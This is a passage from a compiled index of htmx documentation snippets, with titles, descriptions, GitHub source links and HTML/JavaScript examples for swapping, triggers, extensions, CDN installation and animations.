sorting on the `htmx:afterSwap` event\n      sortable.addEventListener(\"htmx:afterSwap\", function() {\n        sortableInstance.option(\"disabled\", false);\n      });\n    }\n})\n```\n\n----------------------------------------\n\nTITLE: hx-swap with swap modifier (timing)\nDESCRIPTION: This example demonstrates how to use the `swap` modifier to introduce a delay of 1 second before the content is swapped after receiving the response from `/example`. This is useful for synchronizing with CSS transitions.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-swap.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n  <!-- this will wait 1s before doing the swap after it is received -->\n  <div hx-get=\"/example\" hx-swap=\"innerHTML swap:1s\">Get Some HTML & Append It</div>\n```\n\n----------------------------------------\n\nTITLE: Server-Side Model Options (HTML)\nDESCRIPTION: This HTML snippet represents the server response containing options for the 'model' select element, based on the selected 'make'. The server is expected to return HTML option tags.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/value-select.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<option value='325i'>325i</option>\n<option value='325ix'>325ix</option>\n<option value='X5'>X5</option> \n```\n\n----------------------------------------\n\nTITLE: Defining htmx Extension\nDESCRIPTION: This HTML snippet demonstrates how to define a simple htmx extension using the `htmx.defineExtension()` function. The extension is named 'my-ext' and includes an `onEvent` handler that logs event information to the console.  This code should typically reside within a separate Javascript file rather than an inline script tag.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/building.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<script>\n  htmx.defineExtension('my-ext', {\n    onEvent : function(name, evt) {\n        console.log(\"Fired event: \" + name, evt);\n    }\n  })\n</script>\n```\n\n----------------------------------------\n\nTITLE: Editable Carnival Ride Table with Selects (HTML)\nDESCRIPTION: This HTML snippet implements an editable carnival ride table using HTML forms and select elements. It leverages hx-put to send data to the /carnival endpoint. Each cell uses a select element to allow users to choose between 'Yes', 'No', and 'Maybe' options for each ride, enabling the table to be dynamically updated.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/webcomponents-work-great.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<form hx-put=/carnival>\n<table>\n  <tr>\n    <th>Name\n    <th>Carousel\n    <th>Roller Coaster\n  </tr>\n  <tr>\n    <td>Alex\n    <td><select name=\"alex-carousel\"> <option selected>Yes <option>No <option> Maybe</select>\n    <td><select name=\"alex-roller\"> <option>Yes <option selected>No <option> Maybe</select>\n  </tr>\n  <tr>\n    <td>Sophia\n    <td><select name=\"sophia-carousel\"> <option selected>Yes <option>No <option> Maybe</select>\n    <td><select name=\"sophia-roller\"> <option selected>Yes <option>No <option> Maybe</select>\n  </tr>\n</table>\n<button>Save</button>\n</form>\n```\n\n----------------------------------------\n\nTITLE: CSS Transition - Toggle Opacity with htmx class-tools\nDESCRIPTION: This snippet demonstrates how to toggle the opacity of a div using the `class-tools` htmx extension. The `classes` attribute is used to toggle the `faded` class, which controls the opacity, with a specified toggle time.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/animations.md#_snippet_12\n\nLANGUAGE: html\nCODE:\n```\n<style>\n.demo.faded {\n  opacity:.3;\n}\n.demo {\n  opacity:1;\n  transition: opacity ease-in 900ms;\n}\n</style>\n<div class=\"demo\" classes=\"toggle faded:1s\">Toggle Demo</div>\n```\n\n----------------------------------------\n\nTITLE: Using hx-on for click event\nDESCRIPTION: This HTML snippet demonstrates how to use the `hx-on:click` attribute to respond to a click event.  When the button is clicked, it will execute the JavaScript code `alert('You clicked me!')`, displaying an alert box. This shows how `hx-on` can replicate the functionality of the standard `onclick` attribute.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_48\n\nLANGUAGE: html\nCODE:\n```\n<button hx-on:click=\"alert('You clicked me!')\">\n    Click Me!\n</button>\n```\n\n----------------------------------------\n\nTITLE: Read-Only Table Row with HTMX Edit Trigger\nDESCRIPTION: This HTML snippet represents a read-only table row. It contains an Edit button that, when clicked, triggers an HTMX GET request to fetch the editable version of the row. JavaScript is used to ensure only one row is edited at a time, using SweetAlert for confirmation.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/edit-row.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<tr>\n      <td>${contact.name}</td>\n      <td>${contact.email}</td>\n      <td>\n        <button class=\"btn danger\"\n                hx-get=\"/contact/${contact.id}/edit\"\n                hx-trigger=\"edit\"\n                onClick=\"let editing = document.querySelector('.editing')\n                         if(editing) {\n                           Swal.fire({title: 'Already Editing',\n                                      showCancelButton: true,\n                                      confirmButtonText: 'Yep, Edit This Row!',\n                                      text:'Hey!  You are already editing a row!  Do you want to cancel that edit and continue?'})\n                           .then((result) => {\n                                if(result.isConfirmed) {\n                                   htmx.trigger(editing, 'cancel')\n                                   htmx.trigger(this, 'edit')\n                                }\n                            })\n                         } else {\n                            htmx.trigger(this, 'edit')\n                         }\">\n          Edit\n        </button>\n      </td>\n    </tr>\n```\n\n----------------------------------------\n\nTITLE: hx-swap with show modifier\nDESCRIPTION: This example demonstrates how to use the `show` modifier to ensure that the top of the element with the ID `another-div` is visible in the viewport after the content from `/example` is swapped into it. The `hx-target` attribute specifies the target element.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-swap.md#_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n  <!-- this will get some content and add it to #another-div, then ensure that the top of #another-div is visible in the \n       viewport -->\n  <div hx-get=\"/example\" \n       hx-swap=\"innerHTML show:top\"\n       hx-target=\"#another-div\">\n    Get Some Content\n  </div>\n```\n\n----------------------------------------\n\nTITLE: View Transitions API - Slide Animation with htmx\nDESCRIPTION: This snippet demonstrates how to use the View Transitions API with htmx to create a slide animation.  CSS keyframes and `view-transition-name` are used to define the animation, and the `transition:true` option in `hx-swap` enables the view transition.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/animations.md#_snippet_14\n\nLANGUAGE: html\nCODE:\n```\n<style>\n   @keyframes fade-in {\n     from { opacity: 0; }\n   }\n\n   @keyframes fade-out {\n     to { opacity: 0; }\n   }\n\n   @keyframes slide-from-right {\n     from { transform: translateX(90px); }\n   }\n\n   @keyframes slide-to-left {\n     to { transform: translateX(-90px); }\n   }\n\n   .slide-it {\n     view-transition-name: slide-it;\n   }\n\n   ::view-transition-old(slide-it) {\n     animation: 180ms cubic-bezier(0.4, 0, 1, 1) both fade-out,\n     600ms cubic-bezier(0.4, 0, 0.2, 1) both slide-to-left;\n   }\n   ::view-transition-new(slide-it) {\n     animation: 420ms cubic-bezier(0, 0, 0.2, 1) 90ms both fade-in,\n     600ms cubic-bezier(0.4, 0, 0.2, 1) both slide-from-right;\n   }\n</style>\n\n\n<div class=\"slide-it\">\n   <h1>Initial Content</h1>\n   <button class=\"btn primary\" hx-get=\"/new-content\" hx-swap=\"innerHTML transition:true\" hx-target=\"closest div\">\n     Swap It!\n   </button>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Path Dependencies Extension with hx-ext - htmx\nDESCRIPTION: This HTML snippet illustrates the use of the path dependencies extension. The `tbody` element has `hx-ext` set to `path-deps`, `hx-trigger` set to `path-deps`, and `path-deps` set to `/contacts`. When the form is submitted to `/contacts`, the extension triggers the `path-deps` event on the table, initiating a GET request to `/contacts/table`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/update-other-content.md#_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<h2>Contacts</h2>\n<table class=\"table\">\n  <thead>\n    <tr>\n      <th>Name</th>\n      <th>Email</th>\n      <th></th>\n    </tr>\n  </thead>\n  <tbody id=\"contacts-table\" hx-get=\"/contacts/table\" hx-ext=\"path-deps\"  hx-trigger=\"path-deps\" path-deps=\"/contacts\">\n    ...\n  </tbody>\n</table>\n<h2>Add A Contact</h2>\n<form hx-post=\"/contacts\">\n  <label>\n    Name\n        <input name=\"name\" type=\"text\">  \n  </label>\n  <label>\n    Email\n        <input name=\"email\" type=\"email\">  \n  </label>\n</form>\n```\n\n----------------------------------------\n\nTITLE: Customizing WebSocket reconnection delay in htmx\nDESCRIPTION: This JavaScript snippet demonstrates how to customize the WebSocket reconnection delay using `htmx.config.wsReconnectDelay`.  The provided function takes the number of retries as input and should return the delay in milliseconds.  The example shows a simple (but not recommended) linear backoff strategy.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/ws.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\n// example reconnect delay that you shouldn't use because\n// it's not as good as the algorithm that's already in place\nhtmx.config.wsReconnectDelay = function (retryCount) {\n    return retryCount * 1000 // return value in milliseconds\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing HTMX Content Swap with View Transitions\nDESCRIPTION: This HTML snippet demonstrates using HTMX to swap content with a view transition. It includes a button with the `hx-get`, `hx-swap`, and `hx-target` attributes to initiate the content swap. The `transition:true` value in `hx-swap` enables the view transition effect, which is connected to the .sample-transition class and its associated CSS animations.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/view-transitions.md#_snippet_4\n\nLANGUAGE: HTML\nCODE:\n```\n<div class=\"sample-transition\" style=\"padding: 24px\">\n   <h1>Initial Content</h1>\n   <button hx-get=\"/new-content\" hx-swap=\"innerHTML transition:true\" hx-target=\"closest div\">\n     Swap It!\n   </button>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Confirming with hx-confirm\nDESCRIPTION: This snippet represents the htmx equivalent to Intercooler's `ic-confirm` attribute.  It uses the `hx-confirm` attribute to display a confirmation dialog before proceeding with the request. Requires the htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_20\n\nLANGUAGE: html\nCODE:\n```\nhx-confirm\n```\n\n----------------------------------------\n\nTITLE: HTML Rows Template with Trigger (JavaScript)\nDESCRIPTION: This JavaScript function generates HTML table rows for contact data. The last row in the set includes htmx attributes (`hx-get`, `hx-trigger`, `hx-swap`) to trigger loading the next page when the row is revealed. This facilitates the infinite scroll behavior.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/infinite-scroll.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\n    function rowsTemplate(page, contacts) {\n      var txt = \"\";\n      var trigger_attributes = \"\";\n\n      for (var i = 0; i < contacts.length; i++) {\n        var c = contacts[i];\n\n        if (i == (contacts.length - 1)) {\n         trigger_attributes = ` hx-get=\\\"/contacts/?page=${page + 1}\\\" hx-trigger=\\\"revealed\\\" hx-swap=\\\"afterend\\\"`\n        }\n\n        txt += \"<tr\" + trigger_attributes +\"><td>\" + c.name + \"</td><td>\" + c.email + \"</td><td>\" + c.id + \"</td></tr>\\n\";\n      }\n      return txt;\n    }\n```\n\n----------------------------------------\n\nTITLE: HTMX Button Trigger\nDESCRIPTION: This HTML snippet creates a button that, when clicked, triggers an HTTP GET request to the '/modal' endpoint. The response is then inserted at the end of the `<body>` element.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/modal-custom.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<button class=\"btn primary\" hx-get=\"/modal\" hx-target=\"body\" hx-swap=\"beforeend\">Open a Modal</button>\n```\n\n----------------------------------------\n\nTITLE: HTML hx-target Inheritance Example\nDESCRIPTION: Demonstrates how the `hx-target` attribute can be inherited from a parent `div` element to child `button` elements, simplifying the code and reducing repetition. The target for the hx-post and hx-delete requests will be the element with id \"output\".\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/QUIRKS.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-target=\"#output\">\n    <button hx-post=\"/items/100/like\">Like</button>\n    <button hx-delete=\"/items/100\">Delete</button>\n</div>\n<output id=\"output\"></output>\n```\n\n----------------------------------------\n\nTITLE: hx-swap with scroll modifier\nDESCRIPTION: This snippet demonstrates how to use the `scroll` modifier to scroll to the bottom of the div after content is appended from `/example`. The div has a fixed height and overflow set to scroll, allowing for scrolling behavior.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-swap.md#_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n  <!-- this fixed-height div will scroll to the bottom of the div after content is appended -->\n  <div style=\"height:200px; overflow: scroll\" \n       hx-get=\"/example\" \n       hx-swap=\"beforeend scroll:bottom\">\n     Get Some HTML & Append It & Scroll To Bottom\n  </div>\n```\n\n----------------------------------------\n\nTITLE: Preserving File Input with hx-preserve Attribute (HTML)\nDESCRIPTION: Demonstrates how to use the `hx-preserve` attribute on an input element to persist its value across form submissions, especially when encountering server-side validation errors.  The file input is included within a form that uses hx-swap to update the form's HTML. The `hx-target` specifies the ID of the element that will be swapped with the response. Omitting the attribute on error can prevent preservation.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/file-upload-input.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<form method=\"POST\" id=\"binaryForm\" enctype=\"multipart/form-data\" hx-swap=\"outerHTML\" hx-target=\"#binaryForm\">\n    <input hx-preserve id=\"someId\" type=\"file\" name=\"binaryFile\">\n    <!-- Other code here, such as input error handling. -->\n    <button type=\"submit\">Submit</button>\n</form>\n```\n\n----------------------------------------\n\nTITLE: Displaying User Images with Safe URLs in HTML\nDESCRIPTION: This code snippet demonstrates how to display user-uploaded images securely by storing them on your server (or S3 bucket) and generating the URLs yourself. The `safe` filter in Nunjucks is used to include the unescaped URL, as the link is generated and known to be safe. This mitigates the risk of malicious URLs.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/web-security-basics-with-htmx.md#_snippet_13\n\nLANGUAGE: HTML\nCODE:\n```\n<img src=\"{{ user.fav_img_s3_url | safe }}\">\n```\n\n----------------------------------------\n\nTITLE: Setting up htmx logger in Javascript\nDESCRIPTION: This JavaScript snippet shows how to set up a logger for htmx events.  It defines a function that takes an element, event, and data as arguments, and logs them to the console if a console object exists.  This is useful for troubleshooting and understanding htmx's behavior.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_42\n\nLANGUAGE: javascript\nCODE:\n```\nhtmx.logger = function(elt, event, data) {\n    if(console) {\n        console.log(event, elt, data);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Preload Trigger: mouseover\nDESCRIPTION: This example configures the preload extension to trigger when the user's mouse hovers over the link for more than 100ms. This can be more aggressive than `mousedown`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/preload.md#_snippet_7\n\nLANGUAGE: HTML\nCODE:\n```\n<a href=\"/server/1\" preload=\"mouseover\">This will be preloaded when the user's mouse remains over it for more than\n    100ms.</a>\n```\n\n----------------------------------------\n\nTITLE: Tab Structure HTML with HTMX\nDESCRIPTION: This HTML snippet defines the structure for a set of tabs.  Each button represents a tab and triggers an HTMX GET request to a specific endpoint when clicked.  The 'selected' class indicates the active tab. The aria attributes enhance accessibility by providing semantic information about the tab list and individual tabs.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/tabs-hateoas.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<div class=\"tab-list\" role=\"tablist\">\n\t<button hx-get=\"/tab1\" class=\"selected\" role=\"tab\" aria-selected=\"true\" aria-controls=\"tab-content\">Tab 1</button>\n\t<button hx-get=\"/tab2\" role=\"tab\" aria-selected=\"false\" aria-controls=\"tab-content\">Tab 2</button>\n\t<button hx-get=\"/tab3\" role=\"tab\" aria-selected=\"false\" aria-controls=\"tab-content\">Tab 3</button>\n</div>\n\n<div id=\"tab-content\" role=\"tabpanel\" class=\"tab-content\">\n\tCommodo normcore truffaut VHS duis gluten-free keffiyeh iPhone taxidermy godard ramps anim pour-over.\n\tPitchfork vegan mollit umami quinoa aute aliquip kinfolk eiusmod live-edge cardigan ipsum locavore.\n\tPolaroid duis occaecat narwhal small batch food truck.\n\tPBR&B venmo shaman small batch you probably haven't heard of them hot chicken readymade.\n\tEnim tousled cliche woke, typewriter single-origin coffee hella culpa.\n\tArt party readymade 90's, asymmetrical hell of fingerstache ipsum.\n</div>\n```\n\n----------------------------------------\n\nTITLE: HTML Trigger for Infinite Scroll (htmx)\nDESCRIPTION: This HTML snippet defines a table row that triggers an htmx request when it is revealed in the viewport. The `hx-get` attribute specifies the endpoint to fetch the next page of contacts, `hx-trigger` sets the event to `revealed`, and `hx-swap` indicates that the new content should be appended after the current row.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/infinite-scroll.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<tr hx-get=\"/contacts/?page=2\"\n    hx-trigger=\"revealed\"\n    hx-swap=\"afterend\">\n  <td>Agent Smith</td>\n  <td>void29@null.org</td>\n  <td>55F49448C0</td>\n</tr>\n```\n\n----------------------------------------\n\nTITLE: Importing htmx Head Support Extension with a Bundler\nDESCRIPTION: This snippet demonstrates how to import both htmx and the `head-support` extension in a JavaScript file when using a bundler like Webpack or Rollup. Both packages need to be installed via npm before importing them. This allows you to manage and bundle the dependencies.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/head-support.md#_snippet_2\n\nLANGUAGE: JS\nCODE:\n```\nimport `htmx.org`;\nimport `htmx-ext-head-support`; \n```\n\n----------------------------------------\n\nTITLE: Handling htmx:confirm Event\nDESCRIPTION: This JavaScript snippet demonstrates how to listen for the `htmx:confirm` event, prevent the default HTMX request, log the event details, and then manually issue the request. It allows for custom confirmation logic before an HTMX request is sent.  Dependencies: None.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/events.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\ndocument.body.addEventListener('htmx:confirm', function(evt) {\n  // 0. To modify the behavior only for elements with the hx-confirm attribute,\n  //    check if evt.detail.target.hasAttribute('hx-confirm')\n\n  // 1. Prevent the default behavior (this will prevent the request from being issued)\n  evt.preventDefault();\n  \n  // 2. Do your own logic here\n  console.log(evt.detail)\n\n  // 3. Manually issue the request when you are ready\n  evt.detail.issueRequest(); // or evt.detail.issueRequest(true) to skip the built-in window.confirm()\n});\n```\n\n----------------------------------------\n\nTITLE: Adding Static Custom Headers with hx-headers in htmx\nDESCRIPTION: This snippet demonstrates how to add a static custom header to an htmx AJAX request using the hx-headers attribute. The value is a JSON object with header name and value.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-headers.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n <div hx-get=\"/example\" hx-headers='{\"myHeader\": \"My Value\"}'>Get Some HTML, Including A Custom Header in the Request</div>\n```\n\n----------------------------------------\n\nTITLE: Installing SSE extension via CDN - HTML\nDESCRIPTION: This snippet demonstrates how to install the htmx SSE extension by loading it via a CDN. It includes the core htmx library and the SSE extension script. The `hx-ext=\"sse\"` attribute is added to the body to enable the extension.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/sse.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<head>\n    <script src=\"https://unpkg.com/htmx.org@2.0.4\" integrity=\"sha384-HGfztofotfshcF7+8n44JQL2oJmowVChPTg48S+jvZoztPfvwD79OC/LTtG6dMp+\" crossorigin=\"anonymous\"></script>\n    <script src=\"https://unpkg.com/htmx-ext-sse@2.2.2\" integrity=\"sha384-Y4gc0CK6Kg+hmulDc6rZPJu0tqvk7EWlih0Oh+2OkAi1ZDlCbBDCQEE2uVk472Ky\" crossorigin=\"anonymous\"></script>\n</head>\n<body hx-ext=\"sse\">\n```\n\n----------------------------------------\n\nTITLE: Initializing SortableJS with jQuery\nDESCRIPTION: This JavaScript snippet demonstrates how to initialize SortableJS on elements with the class 'sortable' using jQuery's `$(document).ready()` function. It selects all elements with the class 'sortable' within the entire document body.  The code iterates through each element and creates a new Sortable instance.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_51\n\nLANGUAGE: javascript\nCODE:\n```\n$(document).ready(function() {\n    var sortables = document.body.querySelectorAll(\".sortable\");\n    for (var i = 0; i < sortables.length; i++) {\n        var sortable = sortables[i];\n        new Sortable(sortable, {\n            animation: 150,\n            ghostClass: 'blue-background-class'\n        });\n    }\n});\n```\n\n----------------------------------------\n\nTITLE: Enhancing with hx-boost\nDESCRIPTION: This snippet shows how to enable enhanced link navigation similar to Intercooler's `ic-enhance` using htmx's `hx-boost`. Enables client-side transition for anchor elements. Requires the htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_4\n\nLANGUAGE: html\nCODE:\n```\nhx-boost\n```\n\n----------------------------------------\n\nTITLE: Including htmx via CDN\nDESCRIPTION: This code snippet demonstrates how to include htmx 2.0.0 in an HTML file using a CDN. The script tag references the minified version of htmx hosted on unpkg.com. This method allows users to quickly add htmx to their projects without needing to download or manage the library locally.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/posts/2024-06-17-htmx-2.0.0-is-released.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<script src=\"https://unpkg.com/htmx.org@2.0.0/dist/htmx.min.js\"></script>\n```\n\n----------------------------------------\n\nTITLE: Toggling Section Visibility with Hyperscript\nDESCRIPTION: This HTML snippet demonstrates inline scripting using hyperscript.  It defines a button that, when clicked, toggles the 'visible' class on the next section element.  Hyperscript syntax is denoted by the `_` attribute.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hypermedia-friendly-scripting.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<button _=\"on click toggle .visible on the next <section/>\">\n    Show Next Section\n</button>\n<section>\n    ....\n</section>\n```\n\n----------------------------------------\n\nTITLE: Destroy TomSelect instances before History Save (JavaScript)\nDESCRIPTION: This JavaScript code snippet demonstrates how to destroy TomSelect instances before saving the DOM state to browser history using `htmx:beforeHistorySave` event to prevent persisting TomSelect mutations.  This ensures that the history snapshot is clean and avoids issues when restoring history.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_38\n\nLANGUAGE: javascript\nCODE:\n```\nhtmx.on('htmx:beforeHistorySave', function() {\n    // find all TomSelect elements\n    document.querySelectorAll('.tomSelect')\n            .forEach(elt => elt.tomselect.destroy()) // and call destroy() on them\n})\n```\n\n----------------------------------------\n\nTITLE: Importing Idiomorph with a Bundler - JavaScript\nDESCRIPTION: This snippet shows how to import the htmx and idiomorph libraries in a JavaScript file when using a bundler (e.g., Webpack, Rollup).  This assumes that htmx and idiomorph have been installed via npm. This needs to be in your `index.js` or other entrypoint file for your bundler.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/idiomorph.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport `htmx.org`;\nimport `idiomorph`; \n```\n\n----------------------------------------\n\nTITLE: Deleting Data with hx-delete in htmx\nDESCRIPTION: This HTML snippet demonstrates how to use the `hx-delete` attribute in htmx to send a DELETE request to a specified URL when a button is clicked. The returned HTML is then swapped into the DOM element specified by the `hx-target` attribute. In this case, the DELETE request is sent to `/account`, and the response replaces the content of the `body` element.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-delete.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<button hx-delete=\"/account\" hx-target=\"body\">\n  Delete Your Account\n</button>\n```\n\n----------------------------------------\n\nTITLE: htmx Installation via CDN\nDESCRIPTION: This code snippet shows how to include htmx in an HTML page using a CDN.  It includes a specific version of htmx from unpkg.com. The `integrity` attribute is used for Subresource Integrity (SRI) to ensure the file hasn't been tampered with.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_3\n\nLANGUAGE: HTML\nCODE:\n```\n<script src=\"https://unpkg.com/htmx.org@2.0.4\" integrity=\"sha384-HGfztofotfshcF7+8n44JQL2oJmowVChPTg48S+jvZoztPfvwD79OC/LTtG6dMp+\" crossorigin=\"anonymous\"></script>\n```\n\n----------------------------------------\n\nTITLE: Importing htmx and SSE extension - Javascript\nDESCRIPTION: This snippet shows how to import both htmx and the sse extension to your `index.js` file when using a bundler. Assumes htmx and htmx-ext-sse are installed via npm.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/sse.md#_snippet_2\n\nLANGUAGE: JS\nCODE:\n```\nimport `htmx.org`;\nimport `htmx-ext-sse`; \n```\n\n----------------------------------------\n\nTITLE: Triggering AJAX with Custom Event from Header - HTML\nDESCRIPTION: This code snippet demonstrates how to trigger an AJAX GET request to '/example' based on a custom event fired via the `HX-Trigger` header in a response. The `from:body` modifier is used because the event is likely triggered in a different DOM hierarchy.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-trigger.md#_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n  <div hx-get=\"/example\" hx-trigger=\"my-custom-event from:body\">\n    Triggered by HX-Trigger header...\n  </div>\n```\n\n----------------------------------------\n\nTITLE: Rendering Search UI in Javascript\nDESCRIPTION: This JavaScript function `searchUI` returns the HTML markup for the search user interface. This function is responsible for generating the HTML including the search input field, the loading indicator, and the table used to display the search results. The HTMX attributes are used to configure the interaction between the input and the server.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/active-search.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n    function searchUI() {\n      return `  <h3>\nSearch Contacts\n<span class=\"htmx-indicator\">\n<img src=\"/img/bars.svg\"/> Searching...\n</span>\n</h3>\n\n<input class=\"form-control\" type=\"search\"\n       name=\"search\" placeholder=\"Begin Typing To Search Users...\"\n       hx-post=\"/search\"\n       hx-trigger=\"input changed delay:500ms, keyup[key=='Enter'], load\"\n       hx-target=\"#search-results\"\n       hx-indicator=\".htmx-indicator\">\n\n<table class=\"table\">\n<thead>\n<tr>\n  <th>First Name</th>\n  <th>Last Name</th>\n  <th>Email</th>\n</tr>\n</thead>\n<tbody id=\"search-results\">\n</tbody>\n</table>`;\n    }\n```\n\n----------------------------------------\n\nTITLE: Installing htmx Head Support Extension via CDN\nDESCRIPTION: This snippet demonstrates how to install the `head-support` extension by including it via a CDN. It includes both the core htmx library and the extension itself within the `<head>` tag. The `hx-ext` attribute on the `<body>` tag enables the extension.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/head-support.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<head>\n    <script src=\"https://unpkg.com/htmx.org@2.0.4\" integrity=\"sha384-HGfztofotfshcF7+8n44JQL2oJmowVChPTg48S+jvZoztPfvwD79OC/LTtG6dMp+\" crossorigin=\"anonymous\"></script>\n    <script src=\"https://unpkg.com/htmx-ext-head-support@2.0.2\" integrity=\"sha384-cvMqHzjCJsOHgGuyB3sWXaUSv/Krm0BdzjuI1rtkjCbL1l1oHJx+cHyVRJhyuEz0\" crossorigin=\"anonymous\"></script>\n</head>\n<body hx-ext=\"head-support\">\n...\n</body>\n```\n\n----------------------------------------\n\nTITLE: hx-sync Active Search Example (HTML)\nDESCRIPTION: This example demonstrates hx-sync with the 'replace' strategy within an active search input. It cancels any in-flight requests and uses only the last request. The hx-trigger attribute's delay modifier is used to debounce the user's input and avoid making multiple requests while the user types.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-sync.md#_snippet_3\n\nLANGUAGE: HTML\nCODE:\n```\n<input type=\"search\" \n    hx-get=\"/search\" \n    hx-trigger=\"keyup changed delay:500ms, search\" \n    hx-target=\"#search-results\"\n    hx-sync=\"this:replace\">\n```\n\n----------------------------------------\n\nTITLE: CSS Transition - Request In Flight Animation with htmx\nDESCRIPTION: This snippet demonstrates how to provide visual feedback during an htmx request by applying a CSS transition to the element that triggers the request. The `htmx-request` class is used to indicate that a request is in progress.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/animations.md#_snippet_9\n\nLANGUAGE: html\nCODE:\n```\n<style>\n  form.htmx-request {\n    opacity: .5;\n    transition: opacity 300ms linear;\n  }\n</style>\n<form hx-post=\"/name\" hx-swap=\"outerHTML\">\n<label>Name:</label><input name=\"name\"><br/>\n<button class=\"btn primary\">Submit</button>\n</form>\n```\n\n----------------------------------------\n\nTITLE: HTML hx-confirm attribute example\nDESCRIPTION: Illustrates the use of the `hx-confirm` attribute on buttons to prompt the user for confirmation before executing a delete or put request. Duplicates `hx-confirm` attributes are shown, which motivates hoisting up to a parent element.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_31\n\nLANGUAGE: html\nCODE:\n```\n<button hx-delete=\"/account\" hx-confirm=\"Are you sure?\">\n    Delete My Account\n</button>\n<button hx-put=\"/account\" hx-confirm=\"Are you sure?\">\n    Update My Account\n</button>\n```\n\n----------------------------------------\n\nTITLE: Using hx-prompt in htmx\nDESCRIPTION: This example demonstrates how to use the `hx-prompt` attribute on a button element to display a prompt before sending a DELETE request. The user's input from the prompt will be included in the `HX-Prompt` header when the request is sent to the server.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-prompt.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<button hx-delete=\"/account\" hx-prompt=\"Enter your account name to confirm deletion\">\n  Delete My Account\n</button>\n```\n\n----------------------------------------\n\nTITLE: Fake Server-Side Code (JavaScript)\nDESCRIPTION: This JavaScript code simulates a server-side environment for the HTMX demo. It includes functions for initializing routes (`init`), handling POST requests (`onPost`), and generating HTML templates (`formTemplate`). It's used to provide dynamic behavior without a real backend.\nSOURCE: 